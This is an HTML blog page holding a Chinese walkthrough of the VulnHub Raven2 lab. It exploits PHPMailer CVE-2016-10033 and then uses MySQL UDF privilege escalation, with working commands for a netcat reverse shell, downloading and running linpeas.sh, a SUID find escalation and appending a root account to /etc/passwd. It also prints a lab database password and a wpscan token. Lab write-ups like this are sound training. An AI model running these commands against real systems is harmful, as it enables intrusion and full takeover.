@@ -1,0 +1,552 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="forg12">
+    
+    <title>
+        
+            vulnhub-raven2 |
+        
+        forg12&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/logo.svg">
+    
+<link rel="stylesheet" href="/css/font-awesome.min.css">
+
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"forg1222.github.io","root":"/","language":"zh-CN","path":"search.json"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"https://forg1222.github.io/images/head.jpeg","favicon":"/images/logo.svg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"background_img":"https://forg1222.github.io/images/bg.svg","description":"Keep writing and Keep loving."},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"6.6.6"};
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+  </script>
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                forg12&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                关于
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">关于</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">vulnhub-raven2</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="https://forg1222.github.io/images/head.jpeg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">forg12</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;
+        <span class="pc">2022-08-03 11:04:17</span>
+        <span class="mobile">2022-08-03 11:04</span>
+    </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/vulnhub/">vulnhub</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>1.4k 字</span>
+        </span>
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ nmap -sP 192.168.56.1/24</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) </span><br><span class="line">Nmap scan report for 192.168.56.2</span><br><span class="line">Host is up (0.0011s latency).</span><br><span class="line">Nmap scan report for 192.168.56.100</span><br><span class="line">Host is up (0.0056s latency).</span><br><span class="line">Nmap scan report for 192.168.56.108</span><br><span class="line">Host is up (0.0044s latency).</span><br><span class="line">Nmap done: 256 IP addresses (3 hosts up) scanned in 2.97 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/vh/raven2]</span><br><span class="line">└─$ nmap -p- 192.168.56.108</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) </span><br><span class="line">Nmap scan report for 192.168.56.108</span><br><span class="line">Host is up (0.00086s latency).</span><br><span class="line">Not shown: 65531 closed tcp ports (conn-refused)</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">22/tcp    open  ssh</span><br><span class="line">80/tcp    open  http</span><br><span class="line">111/tcp   open  rpcbind</span><br><span class="line">47245/tcp open  unknown</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 6.43 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.56.108/ -x 403</span><br><span class="line"></span><br><span class="line">Target: http://192.168.56.108/</span><br><span class="line"></span><br><span class="line">[00:11:22] Starting: </span><br><span class="line">[00:11:22] 301 -  313B  - /js  -&gt;  http://192.168.56.108/js/               </span><br><span class="line">[00:11:23] 200 -   18KB - /.DS_Store                                       </span><br><span class="line">[00:11:32] 200 -   13KB - /about.html                                       </span><br><span class="line">[00:11:45] 200 -    9KB - /contact.php                                      </span><br><span class="line">[00:11:46] 301 -  314B  - /css  -&gt;  http://192.168.56.108/css/              </span><br><span class="line">[00:11:50] 301 -  316B  - /fonts  -&gt;  http://192.168.56.108/fonts/          </span><br><span class="line">[00:11:52] 301 -  314B  - /img  -&gt;  http://192.168.56.108/img/              </span><br><span class="line">[00:11:52] 200 -   16KB - /index.html                                       </span><br><span class="line">[00:11:54] 200 -    4KB - /js/                                              </span><br><span class="line">[00:11:56] 301 -  317B  - /manual  -&gt;  http://192.168.56.108/manual/        </span><br><span class="line">[00:11:56] 200 -  626B  - /manual/index.html                                </span><br><span class="line">[00:12:14] 200 -    5KB - /vendor/                                          </span><br><span class="line">[00:12:15] 200 -    2KB - /wordpress/wp-login.php                           </span><br><span class="line">[00:12:15] 200 -   51KB - /wordpress/                                       </span><br><span class="line">                                                                </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag1&#123;a2c1f66d2b8051bd3a5874b5b6e43e21&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/03/vulnhub-raven2/image-20220808142207917.png" alt="image-20220808142207917"></p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="wpscan"><a href="#wpscan" class="headerlink" title="wpscan"></a>wpscan</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wpscan --api-token nfiU61tvOX0IH0hwkPRsxrtiFTVo0ZGMxTia5sDeXbU --url http://192.168.56.108/wordpress</span><br><span class="line">[!] 33 vulnerabilities identified:</span><br></pre></td></tr></table></figure>
+
+<p>​	试了部分没成功，网上文章说wpscan是根据版本来判断是否存在漏洞，低于漏洞版本则会显示存在漏洞，误报比较多。</p>
+<h2 id="PHPMailer"><a href="#PHPMailer" class="headerlink" title="PHPMailer"></a>PHPMailer</h2><p><img src="/2022/08/03/vulnhub-raven2/image-20220808142956302.png" alt="image-20220808142956302"></p>
+<p>​	通过changelog可以看到该版本为5.2.17，后搜索版本漏洞。</p>
+<p><img src="/2022/08/03/vulnhub-raven2/image-20220808143310738.png" alt="image-20220808143310738"></p>
+<p>​	<a class="link" target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/40974">https://www.exploit-db.com/exploits/40974<i class="fas fa-external-link-alt"></i></a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Usage:</span><br><span class="line">1 - Download docker vulnerable enviroment at: https://github.com/opsxcq/exploit-CVE-2016-10033</span><br><span class="line">2 - Config your IP for reverse shell on payload variable</span><br><span class="line">4 - Open nc listener in one terminal: $ nc -lnvp &lt;your ip&gt;</span><br><span class="line">3 - Open other terminal and run the exploit: python3 anarcoder.py</span><br></pre></td></tr></table></figure>
+
+<h3 id="必要修改参数"><a href="#必要修改参数" class="headerlink" title="必要修改参数"></a>必要修改参数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">target</span><br><span class="line">payload中反弹shell的IP地址</span><br><span class="line">生成文件的绝对路径。</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/03/vulnhub-raven2/image-20220808202655890.png" alt="image-20220808202655890"></p>
+<p>​	执行结束后显示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[+]  ExPLoITeD http://192.168.1.108/contact.php                                                    </span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/03/vulnhub-raven2/image-20220808200413065.png" alt="image-20220808200413065"></p>
+<h3 id="执行后续流程"><a href="#执行后续流程" class="headerlink" title="执行后续流程"></a>执行后续流程</h3><h4 id="监听本地端口"><a href="#监听本地端口" class="headerlink" title="监听本地端口"></a>监听本地端口</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/03/vulnhub-raven2/image-20220808203126166.png" alt="image-20220808203126166"></p>
+<h4 id="target"><a href="#target" class="headerlink" title="target"></a>target</h4><p>​	访问<code>http://192.168.1.108/contact.php</code>，生成backdoor参数的脚本。</p>
+<p><img src="/2022/08/03/vulnhub-raven2/image-20220808203249566.png" alt="image-20220808203249566"></p>
+<h4 id="backdoor"><a href="#backdoor" class="headerlink" title="backdoor"></a>backdoor</h4><p>​	访问<code>http://192.168.1.108/back.php</code>，反弹shell。</p>
+<p><img src="/2022/08/03/vulnhub-raven2/image-20220808201203446.png" alt="image-20220808201203446"></p>
+<h4 id="获取会话"><a href="#获取会话" class="headerlink" title="获取会话"></a>获取会话</h4><p><img src="/2022/08/03/vulnhub-raven2/image-20220808201307618.png" alt="image-20220808201307618"></p>
+<h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">www-data@Raven:/var/www/html$ find / -name flag*</span><br><span class="line">find / -name flag*</span><br><span class="line"></span><br><span class="line">/var/www/html/wordpress/wp-content/uploads/2018/11/flag3.png</span><br><span class="line">/var/www/flag2.txt</span><br><span class="line">/usr/share/doc/apache2-doc/manual/tr/rewrite/flags.html</span><br><span class="line">/usr/share/doc/apache2-doc/manual/ja/rewrite/flags.html</span><br><span class="line">/usr/share/doc/apache2-doc/manual/ko/rewrite/flags.html</span><br><span class="line">/usr/share/doc/apache2-doc/manual/zh-cn/rewrite/flags.html</span><br><span class="line">/usr/share/doc/apache2-doc/manual/de/rewrite/flags.html</span><br><span class="line">/usr/share/doc/apache2-doc/manual/es/rewrite/flags.html</span><br><span class="line">/usr/share/doc/apache2-doc/manual/da/rewrite/flags.html</span><br><span class="line">/usr/share/doc/apache2-doc/manual/pt-br/rewrite/flags.html</span><br><span class="line">/usr/share/doc/apache2-doc/manual/fr/rewrite/flags.html</span><br><span class="line">/usr/share/doc/apache2-doc/manual/en/rewrite/flags.html</span><br><span class="line">/sys/devices/pci0000:00/0000:00:11.0/net/eth0/flags</span><br><span class="line">/sys/devices/virtual/net/lo/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS0/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS1/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS2/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS3/flags</span><br><span class="line">find: `/sys/kernel/debug&#x27;: Permission denied</span><br><span class="line"></span><br><span class="line">www-data@Raven:/var/www/html$ cat /var/www/flag2.txt</span><br><span class="line">cat /var/www/flag2.txt</span><br><span class="line">flag2&#123;6a8ed560f0b5358ecf844108048eb337&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p>​	通过查找，flag3的路径为：<code>/var/www/html/wordpress/wp-content/uploads/2018/11/flag3.png</code>，在web路径下，所以直接通过浏览器访问。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.1.108/wordpress/wp-content/uploads/2018/11/flag3.png</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/03/vulnhub-raven2/image-20220808204116615.png" alt="image-20220808204116615"></p>
+<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><h2 id="Linpeas-sh信息收集"><a href="#Linpeas-sh信息收集" class="headerlink" title="Linpeas.sh信息收集"></a>Linpeas.sh信息收集</h2><p>​	python本地开启http服务。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿Kali)-[~/hk/raven2]</span><br><span class="line">└─$ python3 -m http.server 1111</span><br><span class="line">Serving HTTP on 0.0.0.0 port 1111 (http://0.0.0.0:1111/) ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>​	目标机器下载脚本。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.1.107:1111/linpeas.sh</span><br><span class="line">chmod +x ./linpeas.sh</span><br><span class="line">./linpeas.sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/03/vulnhub-raven2/image-20220809103627933.png" alt="image-20220809103627933"></p>
+<h2 id="UDF提权条件判断"><a href="#UDF提权条件判断" class="headerlink" title="UDF提权条件判断"></a>UDF提权条件判断</h2><p>​	在尝试内核提权无果后，尝试选择使用mysql的UDF提权，接下来开始找mysql中账号root的密码。</p>
+<p><img src="/2022/08/03/vulnhub-raven2/image-20220808204928770.png" alt="image-20220808204928770"></p>
+<h3 id="找mysql账号密码"><a href="#找mysql账号密码" class="headerlink" title="找mysql账号密码"></a>找mysql账号密码</h3><p>​	在web目录下收集mysql的账号密码。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find ./ -name *config*</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/03/vulnhub-raven2/image-20220809134917708.png" alt="image-20220809134917708"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -rn &quot;password&quot; ./wordpress/wp-config.php</span><br></pre></td></tr></table></figure>
+
+<p>​	<!--grep 参数--></p>
+<p>​		<!---n 选项可以输出的行前加入匹配到的行的行号--></p>
+<p>​		<!---r 递归地使用 grep 进行搜索--></p>
+<p><img src="/2022/08/03/vulnhub-raven2/image-20220809135648974.png" alt="image-20220809135648974"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ./wordpress/wp-config.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/03/vulnhub-raven2/image-20220809135716124.png" alt="image-20220809135716124"></p>
+<h3 id="查看secure-file-priv值"><a href="#查看secure-file-priv值" class="headerlink" title="查看secure_file_priv值"></a>查看secure_file_priv值</h3><p>​	拿到mysql的root密码后，进入数据库查看是否满足写入的条件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -pR@v3nSecurity </span><br><span class="line">use mysql;</span><br><span class="line">show global variables where variable_name=&#x27;secure_file_priv&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/03/vulnhub-raven2/image-20220809140602224.png" alt="image-20220809140602224"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1）当 secure_file_priv 的值为 NULL ，表示限制 mysqld 不允许导入|导出，此时无法提权</span><br><span class="line">2）当 secure_file_priv 的值为 /tmp/ ，表示限制 mysqld 的导入|导出只能发生在 /tmp/目录下，此时也无法提权</span><br><span class="line">3）当 secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入|导出做限制，此时可提权!</span><br><span class="line">如果是 MySQL &gt;= 5.1 的版本，必须把 UDF 的动态链接库文件放置于 MySQL 安装目录下的 lib\plugin 文件夹下文件夹下才能创建自定义函数。</span><br></pre></td></tr></table></figure>
+
+<p>​	这里的secure_file_priv的值为空，所以能够提权。</p>
+<h3 id="是否进程是否以root运行"><a href="#是否进程是否以root运行" class="headerlink" title="是否进程是否以root运行"></a>是否进程是否以root运行</h3><p>​	首先先确认是否满足，是否以root用户启动，root账号密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep mysql</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/03/vulnhub-raven2/image-20220809134434744.png" alt="image-20220809134434744"></p>
+<h2 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h2><h3 id="查看mysql插件目录"><a href="#查看mysql插件目录" class="headerlink" title="查看mysql插件目录"></a>查看mysql插件目录</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables where variable_name=&#x27;plugin_dir&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/03/vulnhub-raven2/image-20220809142045012.png" alt="image-20220809142045012"></p>
+<h3 id="编译exp"><a href="#编译exp" class="headerlink" title="编译exp"></a>编译exp</h3><p><a class="link" target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/1518">https://www.exploit-db.com/exploits/1518<i class="fas fa-external-link-alt"></i></a> </p>
+<!--目标机器上编译报错，需要本地编译，但是由于我电脑是m1，导致后续创建函数的时候一致报错。-->
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -g -c 1518.c</span><br><span class="line">gcc -g -shared -o udfexp.so 1518.o -lc</span><br></pre></td></tr></table></figure>
+
+<h3 id="创建高权限执行命令的函数"><a href="#创建高权限执行命令的函数" class="headerlink" title="创建高权限执行命令的函数"></a>创建高权限执行命令的函数</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.2.129:1111/udfexp.so -o /tmp/udfexp.so</span><br><span class="line"></span><br><span class="line">mysql -uroot -pR@v3nSecurity </span><br><span class="line">use mysql;</span><br><span class="line">create table udfexp(line blob);</span><br><span class="line">insert into udfexp values(load_file(&#x27;/tmp/udfexp.so&#x27;));</span><br><span class="line">select * from udfexp into dumpfile &#x27;/usr/lib/mysql/plugin/udfexp.so&#x27;;</span><br><span class="line">create function do_system returns integer soname &#x27;udfexp.so&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/03/vulnhub-raven2/image-20220809145957109.png" alt="image-20220809145957109"></p>
+<p>​	</p>
+<h3 id="do-system利用方式"><a href="#do-system利用方式" class="headerlink" title="do_system利用方式"></a>do_system利用方式</h3><p>​	此时udf提权创建函数已经成功，通过该函数可执行系统命令。</p>
+<h4 id="给find命令所有者的suid权限"><a href="#给find命令所有者的suid权限" class="headerlink" title="给find命令所有者的suid权限"></a>给find命令所有者的suid权限</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select do_system(&#x27;chmod u+s /usr/bin/find&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/03/vulnhub-raven2/image-20220809150345253.png" alt="image-20220809150345253"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -exec &quot;/bin/sh&quot; \;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/03/vulnhub-raven2/image-20220809150951582.png" alt="image-20220809150951582"></p>
+<h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select do_system(&#x27;nc -nv 192.168.2.129 7788 -e /bin/bash&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/03/vulnhub-raven2/image-20220809152003123.png" alt="image-20220809152003123"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 7799</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/03/vulnhub-raven2/image-20220809152034367.png" alt="image-20220809152034367"></p>
+<h4 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd hello # VVtMBSH8hF8is</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/03/vulnhub-raven2/image-20220809152343012.png" alt="image-20220809152343012"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select do_system(&#x27;echo &quot;hello:VVtMBSH8hF8is:0:0:root:/root:/bin/bash&quot; &gt;&gt; /etc/passwd&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/03/vulnhub-raven2/image-20220809152555485.png" alt="image-20220809152555485"></p>
+<p><img src="/2022/08/03/vulnhub-raven2/image-20220809152623247.png" alt="image-20220809152623247"></p>
+
+        </div>
+
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/vulnhub/">#vulnhub</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2022/08/04/vulnhub-troll1/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">vulnhub-troll1</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2022/08/02/vulnhub-lampiao/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">vulnhub-lampiao</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2020</span>
+              -
+            
+            2023&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">forg12</a>
+        </div>
+        
+            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v6.6.6</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
